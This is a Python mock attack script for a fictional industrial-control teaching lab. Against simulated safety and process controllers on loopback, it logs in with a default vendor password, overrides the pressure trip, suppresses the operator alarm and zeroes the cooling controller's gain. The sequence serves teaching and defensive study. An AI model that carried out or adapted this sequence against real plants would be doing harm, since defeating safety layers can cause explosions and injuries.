#!/usr/bin/env python3
"""
vel_inject.py - the mock attack tool.

This is what the attacker's activity looks like from the plant's side. It is
deliberately small, because the real thing would be small. There is no exploit
in it. There is no malware in it. It is forty lines of socket code and the
vendor's published password.

Run it against the lab:

    python3 plantlab/serve.py            # terminal 1, the plant
    python3 vel_inject.py recon          # terminal 2, look around
    python3 vel_inject.py inject         # terminal 2, do the thing

Authorised use: your own lab only. It is here to demonstrate a defect in a
fictional controller, not to be pointed at anything real.
"""

from __future__ import annotations

import argparse
import json
import socket
import sys
import time

sys.path.insert(0, __file__.rsplit("/", 1)[0])

from plantlab import config as C
from plantlab.protocol import ProtocolClient, recv_frame, send_frame

BANNER = r"""
              __     _        _           _
  __ _____   / /    (_)__    (_)__  ___ _/ /_
 / // / -_) / /__  / / _ \  / / _ \/ _ `/ __/
 \_, /\__/ /____/_/ /_//_/ /_/_//_/\_,_/\__/
/___/                 mock engineering tool
       for the Deccan OT-03 teaching lab
"""


def line(txt: str = "") -> None:
    print(txt, flush=True)


def stage(n: int, title: str) -> None:
    line()
    line("=" * 74)
    line(f"  STAGE {n}: {title}")
    line("=" * 74)


def connect(port: int) -> ProtocolClient:
    c = ProtocolClient(C.LOOPBACK, port, name="ENG-DCS-01")
    c.connect()
    return c


# ---------------------------------------------------------------------------

def recon() -> None:
    """Stage 1. What is listening, and who am I talking to?"""
    stage(1, "RECONNAISSANCE - what is on this network segment")
    line(f"peer       : {C.LOOPBACK}")
    line(f"targets    : plant segment, VLAN separated, same physical switch")
    for name, port in (("SafeGuard SIS logic solver", C.SIS_PORT),
                       ("Centra DCS controller", C.DCS_PORT)):
        s = socket.socket()
        s.settimeout(2)
        try:
            s.connect((C.LOOPBACK, port))
            s.close()
            line(f"  port {port:<6} open    {name}")
        except OSError:
            line(f"  port {port:<6} CLOSED  {name}")

    line()
    line("talking to the safety controller:")
    sis = connect(C.SIS_PORT)
    ident = sis.call("identify")
    sis.close()
    line("  " + json.dumps(ident, indent=2).replace("\n", "\n  "))

    line()
    line("note what the controller said:")
    line("  'auth_required': false      <- the protocol asks nothing of me")
    line("  the key switch is in RUN    <- an override is still allowed")


def inject() -> None:
    """Stage 2-4. The three writes, in the order the incident made them."""
    stage(2, "LAYER 3 - put a maintenance override on the pressure input")
    sis = connect(C.SIS_PORT)
    ident = sis.call("identify")
    line(f"target      : {ident['product']}   logic {ident['logic_version']}")
    line(f"key switch  : {ident['key_switch']}")

    # The password is in the vendor's installation guide (F12). It is the same
    # on every installation of this software build. Deccan never changed it.
    pw = C.VENDOR_DOC_CONFIG_PASSWORD
    line()
    line(f"password    : {pw!r}")
    line("              read from the vendor install guide, section 4.3;")
    line("              'a site wide value, identical on all installations'")
    reply = sis.call("auth", password=pw, operator="ENG-DCS-01")
    line(f"auth        : {reply}")
    if not reply.get("ok"):
        line("configuration mode refused - stopping")
        sis.close()
        return

    reply = sis.call("override.set", tag=C.PT_HP, operator="ENG-DCS-01",
                     reason="instrument drift check")
    line(f"override    : {json.dumps(reply['override'])}")
    line("              expires: null   <- there is no time limit (F10)")
    line("              accepted while the key switch is in RUN (F13)")

    line()
    line("what the safety function can now see:")
    line("  the pressure input reads as healthy no matter what the reactor does.")
    line("  the trip is not broken. it cannot be reached. that is an override.")

    stage(3, "LAYER 2 - take the high pressure alarm off the operator")
    dcs = connect(C.DCS_PORT)
    reply = dcs.call("alarm.suppress", tag=C.ALM_HP,
                     account="a.rathod@deccan.local", workstation="ENG-DCS-01")
    line(f"alarm       : {C.ALM_HP} suppressed -> {reply['alarm']['suppressed']}")
    line("              the operator is not told. the suppression list exists,")
    line("              it is simply not drawn on his default view (F17).")

    stage(4, "LAYER 1 - break the cooling without touching the set point")
    line("reading the loop first:")
    loops = dcs.call("loop.read", tag=C.FIC_COOL)["loops"]
    line(f"  {C.FIC_COOL}: {json.dumps(loops[0])}")
    reply = dcs.call("loop.configure", tag=C.FIC_COOL, gain=0.0, bias=0.0,
                     account="a.rathod@deccan.local", workstation="ENG-DCS-01")
    line()
    line(f"writing     : gain 1.0 -> 0.0")
    line(f"              {json.dumps(reply['changed'])}")
    line("              the output now tracks sp*gain+bias = 0 for every")
    line("              set point. the set point is never touched, so the")
    line("              operator's screen shows a healthy controller, and the")
    line("              journal records no operating action (F2).")

    stage(5, "CHECK - the state of the plant as the attacker leaves it")
    overrides = sis.call("override.list")["overrides"]
    alarms = dcs.call("alarm.list")
    line(f"safety overrides live        : {json.dumps(overrides)}")
    line(f"suppressed alarms            : {json.dumps(alarms['suppressed'])}")
    line(f"suppressed list on screen?   : {alarms['displayed_by_default']}")
    loops = dcs.call("loop.evaluate", tag=C.FIC_COOL)["loop"]
    line(f"coolant controller set point : {loops['sp']}")
    line(f"coolant controller gain      : {loops['gain']}")
    line(f"coolant controller output    : {loops['out']}   <- was 62.0 an hour ago")
    line()
    line("three protection layers are now out of the way and nothing has been")
    line("broken. no malware, no exploit, no unusual process. three writes.")
    sis.close()
    dcs.close()

    line()
    line("what happens next is not part of the attack and needs no tooling:")
    line("cooling is gone, so the reactor heats, the pressure climbs, the alarm")
    line("never appears, the trip never fires, and the last layer - a spring,")
    line("some steel and no electronics at all - is the one that saves the site.")


# ---------------------------------------------------------------------------

def main() -> int:
    ap = argparse.ArgumentParser(description="mock VEL/1 injection tool")
    ap.add_argument("mode", choices=["recon", "inject"])
    args = ap.parse_args()
    print(BANNER)
    print(f"  target  : {C.LOOPBACK}  sis:{C.SIS_PORT}  dcs:{C.DCS_PORT}")
    print(f"  site    : {C.SITE}")
    try:
        recon() if args.mode == "recon" else inject()
    except (ConnectionRefusedError, OSError) as exc:
        line()
        line(f"could not reach the controller ({exc}).")
        line("start the plant first:  python3 plantlab/serve.py")
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
